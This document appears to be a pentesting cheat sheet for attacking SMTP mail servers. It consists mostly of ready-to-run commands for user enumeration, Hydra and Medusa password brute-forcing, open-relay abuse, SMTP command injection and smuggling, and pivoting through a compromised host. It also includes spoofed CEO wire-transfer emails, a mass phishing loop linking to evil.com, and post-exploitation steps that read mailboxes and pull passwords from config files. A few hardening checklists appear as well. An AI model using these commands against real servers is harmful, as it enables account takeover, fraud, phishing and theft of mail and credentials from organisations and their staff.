# SMTP ENUMERATION (Port 25/465/587)

## PORT OVERVIEW
```
Port 25  - SMTP (Standard, often unencrypted)
Port 465 - SMTPS (SMTP over TLS/SSL - implicit)
Port 587 - Submission (SMTP with STARTTLS - explicit)
Port 2525 - Alternative SMTP (non-standard)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p25,465,587 <IP>                      # Service/Version detection
nc -nv <IP> 25                                  # Manual banner grab
telnet <IP> 25                                  # Alternative banner grab
openssl s_client -connect <IP>:465 -quiet       # SMTPS banner (implicit TLS)
openssl s_client -connect <IP>:587 -starttls smtp  # Submission banner (explicit TLS)
swaks --server <IP>                             # Swiss Army Knife for SMTP
```

## SMTP COMMANDS OVERVIEW
```bash
# Basic SMTP Commands (RFC 5321)
HELO <domain>                                   # Identify client (old style)
EHLO <domain>                                   # Identify client (extended SMTP)
MAIL FROM:<sender@example.com>                  # Specify sender
RCPT TO:<recipient@example.com>                 # Specify recipient
DATA                                            # Begin message body
RSET                                            # Reset session
VRFY <user>                                     # Verify email address exists
EXPN <alias>                                    # Expand mailing list/alias
HELP                                            # Show available commands
NOOP                                            # No operation (keepalive)
QUIT                                            # Close connection

# Extended SMTP Commands
STARTTLS                                        # Upgrade to TLS/SSL
AUTH PLAIN                                      # Plain text authentication
AUTH LOGIN                                      # Login authentication
AUTH CRAM-MD5                                   # Challenge-response auth
AUTH NTLM                                       # NTLM authentication
SIZE <bytes>                                    # Maximum message size
ETRN <domain>                                   # Extended turn (queue processing)
```

## MANUAL SMTP TESTING (TELNET/NC)
```bash
# Connect and enumerate
nc -nv <IP> 25
> EHLO test.com                                 # Get server capabilities
> HELP                                          # List available commands
> VRFY root                                     # Verify user exists
> VRFY admin
> EXPN root                                     # Expand alias/list
> QUIT

# Full mail send example
nc -nv <IP> 25
> EHLO attacker.com
> MAIL FROM:<sender@example.com>
> RCPT TO:<victim@target.com>
> DATA
> Subject: Test Email
> From: sender@example.com
> To: victim@target.com
>
> This is a test message.
> .                                             # Single dot ends message
> QUIT
```

## USER ENUMERATION
```bash
# VRFY method (Verify user)
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>
smtp-user-enum -M VRFY -u root -t <IP>          # Single user
nc <IP> 25
> VRFY root                                     # Manual VRFY
> VRFY admin

# EXPN method (Expand mailing list)
smtp-user-enum -M EXPN -U users.txt -t <IP>
nc <IP> 25
> EXPN admin                                    # Manual EXPN

# RCPT TO method (most reliable)
smtp-user-enum -M RCPT -U users.txt -t <IP>
nc <IP> 25
> MAIL FROM:<test@test.com>
> RCPT TO:<root@target.com>                     # Check response code (250=exists, 550=not exist)

# Nmap user enumeration
nmap --script=smtp-enum-users -p25 <IP>
nmap --script=smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} -p25 <IP>

# Common usernames to test
root, admin, administrator, postmaster, webmaster, info, support, sales, contact
```

## NMAP ENUMERATION SCRIPTS
```bash
nmap --script "smtp-*" -p25,465,587 <IP>        # Run ALL SMTP scripts
nmap --script=smtp-commands -p25 <IP>           # Enumerate available commands
nmap --script=smtp-enum-users -p25 <IP>         # User enumeration
nmap --script=smtp-open-relay -p25 <IP>         # Test for open relay
nmap --script=smtp-ntlm-info -p25,587 <IP>      # Extract NTLM info (internal domain, hostname)
nmap --script=smtp-vuln* -p25 <IP>              # Check known vulnerabilities
nmap --script=smtp-brute -p25 <IP>              # Brute force authentication
nmap --script=smtp-strangeport -p25 <IP>        # Detect SMTP on unusual ports
```

## OPEN RELAY TESTING
```bash
# Check if server relays mail for external domains
nmap --script=smtp-open-relay -p25 <IP>

# Manual relay test
nc <IP> 25
> EHLO attacker.com
> MAIL FROM:<spammer@external.com>
> RCPT TO:<victim@external.com>                 # If accepted, it's an open relay!
> QUIT

# Automated relay testing
swaks --to victim@external.com --from spammer@external.com --server <IP>

# Test multiple relay scenarios
telnet <IP> 25
> MAIL FROM:<>                                  # Null sender (bounce messages)
> RCPT TO:<external@domain.com>
```

## SMTP AUTHENTICATION TESTING
```bash
# Check available auth methods
nc <IP> 25
> EHLO test.com                                 # Look for "AUTH" line in response

# AUTH PLAIN (base64 encoded: \0username\0password)
echo -ne '\0username\0password' | base64        # Encode credentials
nc <IP> 25
> EHLO test.com
> AUTH PLAIN AHVzZXJuYW1lAHBhc3N3b3Jk          # Send base64 encoded creds

# AUTH LOGIN (username and password sent separately, base64 encoded)
echo -n "username" | base64                     # dXNlcm5hbWU=
echo -n "password" | base64                     # cGFzc3dvcmQ=
nc <IP> 25
> EHLO test.com
> AUTH LOGIN
> dXNlcm5hbWU=                                  # Username in base64
> cGFzc3dvcmQ=                                  # Password in base64

# Test with swaks
swaks --server <IP> --auth-user admin --auth-password pass123
swaks --server <IP> --auth PLAIN --auth-user admin --auth-password pass123
```

## BRUTE FORCE AUTHENTICATION
```bash
# Hydra
hydra -l admin -P passwords.txt <IP> smtp       # Single user
hydra -L users.txt -P passwords.txt <IP> smtp   # User/pass lists
hydra -l admin -P rockyou.txt -s 587 <IP> smtp  # Submission port

# Nmap
nmap --script=smtp-brute -p25 <IP>
nmap --script=smtp-brute --script-args userdb=users.txt,passdb=pass.txt -p25 <IP>

# Medusa
medusa -h <IP> -u admin -P passwords.txt -M smtp
medusa -h <IP> -U users.txt -P passwords.txt -M smtp

# Metasploit
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <IP>; run"
```

## TLS/STARTTLS TESTING
```bash
# Test STARTTLS support
nmap --script=smtp-commands -p25 <IP> | grep STARTTLS
openssl s_client -connect <IP>:25 -starttls smtp  # Manual STARTTLS
openssl s_client -connect <IP>:587 -starttls smtp  # Submission port

# Test SMTPS (implicit TLS on port 465)
openssl s_client -connect <IP>:465 -quiet
> EHLO test.com

# Check SSL/TLS configuration
nmap --script=ssl-enum-ciphers -p465,587 <IP>   # Check ciphers
sslscan <IP>:465                                # SSL vulnerability scan
testssl.sh <IP>:465                             # Comprehensive TLS testing

# Test weak ciphers
openssl s_client -connect <IP>:465 -cipher 'DES-CBC3-SHA'  # Weak cipher test
```

## NTLM INFORMATION DISCLOSURE
```bash
# Extract Windows domain info via SMTP NTLM auth
nmap --script=smtp-ntlm-info -p25,587 <IP>      # Get hostname, domain, DNS name
nmap --script=smtp-ntlm-info --script-args smtp-ntlm-info.domain=WORKGROUP -p25 <IP>

# Manual NTLM probe
telnet <IP> 587
> EHLO test
> AUTH NTLM
> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=  # NTLM Type 1 message
# Server responds with Type 2 containing domain/hostname info
```

## EMAIL SENDING & SPOOFING
```bash
# Send email with swaks (Swiss Army Knife for SMTP)
swaks --to victim@target.com --from sender@example.com --server <IP> --body "Test email"
swaks --to victim@target.com --from boss@company.com --server <IP> --header "Subject: Urgent" --body "Please click here"

# Spoof email with custom headers
swaks --to victim@target.com --from ceo@company.com --server <IP> \
  --header "Subject: Wire Transfer" \
  --header "From: CEO <ceo@company.com>" \
  --body "Please transfer $50,000 to account..."

# Send with attachment
swaks --to victim@target.com --from sender@example.com --server <IP> \
  --attach /path/to/payload.pdf --body "See attached document"

# Send HTML email
swaks --to victim@target.com --from sender@example.com --server <IP> \
  --header "Content-Type: text/html" \
  --body "<html><body><h1>Phishing Page</h1><a href='http://evil.com'>Click here</a></body></html>"

# Manual email send
nc <IP> 25
> EHLO attacker.com
> MAIL FROM:<spoofed@legitimate.com>
> RCPT TO:<victim@target.com>
> DATA
> From: "CEO" <ceo@company.com>
> To: victim@target.com
> Subject: Urgent Action Required
> Date: Mon, 17 Dec 2025 10:00:00 +0000
>
> This is a spoofed email message.
> .
> QUIT
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/smtp/smtp_version         # Version detection
use auxiliary/scanner/smtp/smtp_enum            # User enumeration
use auxiliary/scanner/smtp/smtp_relay           # Open relay test
use auxiliary/scanner/smtp/smtp_ntlm_info       # NTLM info disclosure
use auxiliary/dos/smtp/sendmail_prescan         # Sendmail DoS (CVE-2006-7251)
use exploit/unix/smtp/exim4_string_format       # Exim4 exploit
use exploit/linux/smtp/haraka                   # Haraka SMTP exploit
```

## VULNERABILITY SCANNING
```bash
# Search for SMTP exploits
searchsploit smtp                               # All SMTP exploits
searchsploit postfix                            # Postfix exploits
searchsploit sendmail                           # Sendmail exploits
searchsploit exim                               # Exim exploits
nmap --script=smtp-vuln* -p25 <IP>              # Known SMTP vulnerabilities

# Common vulnerabilities
# CVE-2020-28017: Exim 4 RCE (heap overflow)
# CVE-2019-10149: Exim 4 RCE (execute arbitrary commands)
# CVE-2016-0742: Exim DKIM bypass
# CVE-2014-3566: POODLE (SSLv3)
# CVE-2011-1764: Exim DKIM heap overflow
```

## SMTP SERVER FINGERPRINTING
```bash
# Identify SMTP server software
smtp-user-enum -t <IP> -m VRFY -u root          # Banner in output
nmap -sV -p25 <IP>                              # Version detection
nc <IP> 25                                      # Read banner

# Common SMTP servers
# 220 mail.example.com ESMTP Postfix
# 220 mail.example.com ESMTP Exim
# 220 mail.example.com ESMTP Sendmail
# 220 mail.example.com Microsoft ESMTP MAIL Service
# 220 mail.example.com ESMTP qmail
```

## HEADER ANALYSIS & EMAIL FORENSICS
```bash
# Analyze email headers for information leakage
# Headers often reveal:
# - Internal IP addresses
# - Server hostnames
# - Email client versions
# - Mail routing paths
# - Authentication results (SPF, DKIM, DMARC)

# Extract headers from received email
cat email.eml | grep -E "Received:|X-|Message-ID:"

# Useful header fields
Received:                                       # Mail routing path
Message-ID:                                     # Unique message identifier
X-Mailer:                                       # Email client version
X-Originating-IP:                               # Sender IP address
Return-Path:                                    # Bounce address
Authentication-Results:                         # SPF/DKIM/DMARC results
```

## EMAIL HARVESTING & OSINT
```bash
# Harvest email addresses from domain
theharvester -d target.com -b all               # Gather emails from OSINT
hunter.io                                       # Email finder service (web)
phonebook.cz                                    # Email/subdomain search

# Search for emails in data breaches
h8mail -t target@company.com                    # Check breached credentials
dehashed.com                                    # Breach database search

# Verify email existence (without SMTP)
curl "https://api.hunter.io/v2/email-verifier?email=target@company.com&api_key=<KEY>"
```

## AUTOMATION TOOLS
```bash
# SWAKS (Swiss Army Knife for SMTP)
swaks --to test@target.com --server <IP>        # Basic test
swaks --to test@target.com --server <IP> --dump-mail  # Show full transaction

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t <IP>     # VRFY method
smtp-user-enum -M EXPN -U users.txt -t <IP>     # EXPN method
smtp-user-enum -M RCPT -U users.txt -t <IP>     # RCPT method

# ismtp (Interactive SMTP client)
ismtp -h <IP>                                   # Interactive SMTP session
```

## INTERESTING FILES & LOCATIONS
```bash
# Mail server configuration files
/etc/postfix/main.cf                            # Postfix config
/etc/postfix/master.cf                          # Postfix master config
/etc/exim/exim.conf                             # Exim config
/etc/exim4/exim4.conf.template                  # Exim4 config (Debian)
/etc/sendmail.cf                                # Sendmail config
/etc/mail/sendmail.cf                           # Sendmail alternative location
/var/qmail/control/                             # Qmail config directory

# Mail spool/queue directories
/var/spool/mail/                                # User mailboxes
/var/mail/                                      # Alternative mailbox location
/var/spool/postfix/                             # Postfix queue
/var/spool/exim4/                               # Exim queue
/var/spool/mqueue/                              # Sendmail queue

# Log files
/var/log/mail.log                               # Mail server logs (Debian/Ubuntu)
/var/log/maillog                                # Mail logs (RedHat/CentOS)
/var/log/exim/                                  # Exim logs
/var/log/postfix.log                            # Postfix logs

# SSL/TLS certificates
/etc/ssl/certs/                                 # SSL certificates
/etc/pki/tls/certs/                             # Alternative cert location
/etc/letsencrypt/live/                          # Let's Encrypt certs
```

## SMTP CONFIG ANALYSIS
```bash
# Check for dangerous settings (if config readable)
grep -E "smtpd_recipient_restrictions|relay_domains|mynetworks" /etc/postfix/main.cf
grep -E "relay_from_hosts|relay_to_domains" /etc/exim4/exim4.conf.template

# Common misconfigurations
# - Open relay (no recipient restrictions)
# - Weak authentication requirements
# - Outdated TLS versions (SSLv3, TLS 1.0)
# - VRFY/EXPN commands enabled
# - No SPF/DKIM/DMARC
```

## SPF/DKIM/DMARC ENUMERATION
```bash
# Check SPF record
dig txt target.com | grep "v=spf1"
nslookup -type=txt target.com | grep "v=spf1"
host -t txt target.com

# Check DMARC record
dig txt _dmarc.target.com
nslookup -type=txt _dmarc.target.com

# Check DKIM record (need selector, commonly: default, mail, google)
dig txt default._domainkey.target.com
dig txt mail._domainkey.target.com
dig txt google._domainkey.target.com

# Test email authentication
swaks --to test@gmail.com --from spoofed@target.com --server <IP>
# Then check received email headers for SPF/DKIM/DMARC results
```

## SMTP COMMAND INJECTION
```bash
# Test for command injection in SMTP commands
nc <IP> 25
> EHLO test`whoami`.com
> VRFY root$(id)
> MAIL FROM:<test@test.com`id`>

# Header injection
> DATA
> To: victim@target.com
> Subject: Test
> Bcc: attacker@evil.com                        # Try injecting BCC
> Cc: attacker@evil.com
> .
```

## SMTP SMUGGLING & DESYNC
```bash
# SMTP smuggling (CVE-2023-51765)
# Exploits parsing differences between sending and receiving servers

# Test for SMTP smuggling vulnerability
nc <IP> 25
> EHLO test.com
> MAIL FROM:<sender@test.com>
> RCPT TO:<victim@target.com>
> DATA
> Subject: Test
>
> Message body
> \r\nMAIL FROM:<smuggled@evil.com>\r\n         # Smuggled command
> .
> QUIT
```

## COMMON MISCONFIGURATIONS
```
☐ Open relay (allows relaying for any domain)
☐ VRFY/EXPN commands enabled (user enumeration)
☐ No authentication required for sending
☐ Weak/no TLS configuration
☐ Banner disclosure (server version visible)
☐ No rate limiting (brute force possible)
☐ No SPF/DKIM/DMARC records
☐ Outdated mail server version
☐ Accepts mail from null sender (<>)
☐ Internal IP disclosure in headers
```

## SMTP HARDENING CHECKS
```bash
# Verify security settings
# - Relay restrictions in place
# - TLS required for auth
# - VRFY/EXPN disabled
# - Rate limiting enabled
# - SPF/DKIM/DMARC configured
# - Latest software version
# - Strong cipher suites only
```

## QUICK WIN CHECKLIST
```
☐ Banner grab for version detection
☐ Check for known vulnerabilities (searchsploit)
☐ Test for open relay
☐ User enumeration (VRFY, EXPN, RCPT TO)
☐ NTLM info disclosure (domain name, hostname)
☐ Test STARTTLS support
☐ Check SSL/TLS configuration (weak ciphers)
☐ Brute force authentication
☐ Check SPF/DKIM/DMARC records
☐ Test email spoofing
☐ Look for internal IP disclosure in headers
☐ Test for SMTP command injection
☐ Check for SMTP smuggling vulnerability
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive SMTP scan
nmap -sV -p25,465,587 --script "smtp-* and not smtp-brute" -oA smtp_enum <IP>

# Quick user enumeration
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>

# Quick open relay test
nmap --script=smtp-open-relay -p25 <IP>
```

## ADVANCED TECHNIQUES
```bash
# Enumerate via timing analysis
for user in $(cat users.txt); do
  TIME=$(time nc <IP> 25 <<< "VRFY $user" 2>&1 | grep real)
  echo "$user: $TIME"
done

# Mass mail sending (phishing campaigns)
while read email; do
  swaks --to $email --from legitimate@company.com --server <IP> \
    --header "Subject: Password Reset" \
    --body "Click here to reset: http://evil.com/phish"
done < email_list.txt

# SMTP over SSH tunnel
ssh -L 2525:internal-smtp:25 user@<gateway>     # Forward internal SMTP
telnet localhost 2525                           # Access via tunnel

# SMTP pivoting through compromised host
# On compromised host:
socat TCP-LISTEN:2525,fork TCP:<internal_smtp>:25
# From attacker:
swaks --server <compromised_host>:2525 --to internal@target.com
```

## POST-EXPLOITATION (AFTER SMTP ACCESS)
```bash
# With valid credentials:
1. Send phishing emails to internal users
2. Enumerate internal email addresses
3. Read configuration files for other credentials
4. Access mail queue for sensitive information
5. Pivot to other internal mail servers
6. Extract email data from spool directories

# Read user emails (if filesystem access)
cat /var/mail/root                              # Root's mailbox
cat /var/spool/mail/username                    # User's mailbox
find /var/spool/postfix/ -type f -exec cat {} \;  # Postfix queue

# Extract credentials from config
grep -i "password\|secret\|api" /etc/postfix/main.cf
grep -i "password\|secret" /etc/exim4/passwd.client
```
